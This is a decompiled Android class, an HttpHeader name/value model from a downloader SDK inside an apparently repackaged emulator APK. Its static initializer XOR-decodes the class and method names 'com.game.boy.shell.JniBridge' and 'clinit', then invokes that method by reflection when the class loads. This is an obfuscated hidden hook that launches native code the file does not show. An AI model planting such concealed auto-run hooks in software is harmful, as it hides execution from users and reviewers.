package com.ss.android.socialbase.downloader.model;

import ADYaiT.CtFAbx;
import android.os.Parcel;
import android.os.Parcelable;
import android.text.TextUtils;
import java.lang.reflect.Method;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public class w implements Parcelable, Comparable {
    public static final Parcelable.Creator<w> CREATOR = new Parcelable.Creator<w>() { // from class: com.ss.android.socialbase.downloader.model.w.1
        @Override // android.os.Parcelable.Creator
        /* renamed from: xj, reason: merged with bridge method [inline-methods] */
        public w createFromParcel(Parcel parcel) {
            return new w(parcel);
        }

        @Override // android.os.Parcelable.Creator
        /* renamed from: xj, reason: merged with bridge method [inline-methods] */
        public w[] newArray(int i) {
            return new w[i];
        }
    };
    private final String hf;
    private final String xj;

    static {
        zzlJ();
    }

    public w(String str, String str2) {
        this.xj = str;
        this.hf = str2;
    }

    private static /* synthetic */ void zzlJ() {
        char[] charArray = "1=?|53?7|0=+|!:7>>|\u0018<;\u0010 ;657".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 'R');
        }
        String str = new String(charArray);
        char[] charArray2 = "1>;<;&".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 'R');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    @Override // java.lang.Comparable
    public int compareTo(Object obj) {
        if (!(obj instanceof w)) {
            return 1;
        }
        w wVar = (w) obj;
        if (TextUtils.equals(this.xj, wVar.xj())) {
            return 0;
        }
        String str = this.xj;
        if (str == null) {
            return -1;
        }
        int compareTo = str.compareTo(wVar.xj());
        if (compareTo > 0) {
            return 1;
        }
        return compareTo < 0 ? -1 : 0;
    }

    @Override // android.os.Parcelable
    public int describeContents() {
        return 0;
    }

    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj != null && getClass() == obj.getClass()) {
            w wVar = (w) obj;
            if (TextUtils.equals(this.xj, wVar.xj) && TextUtils.equals(this.hf, wVar.hf)) {
                return true;
            }
        }
        return false;
    }

    public int hashCode() {
        String str = this.xj;
        int hashCode = (str == null ? 0 : str.hashCode()) * 31;
        String str2 = this.hf;
        return hashCode + (str2 != null ? str2.hashCode() : 0);
    }

    public String hf() {
        return this.hf;
    }

    public String toString() {
        StringBuilder sb = new StringBuilder("HttpHeader{name='");
        sb.append(this.xj);
        sb.append("', value='");
        return CtFAbx.B25kr6(sb, this.hf, "'}");
    }

    @Override // android.os.Parcelable
    public void writeToParcel(Parcel parcel, int i) {
        parcel.writeString(this.xj);
        parcel.writeString(this.hf);
    }

    public String xj() {
        return this.xj;
    }

    public w(Parcel parcel) {
        this.xj = parcel.readString();
        this.hf = parcel.readString();
    }
}
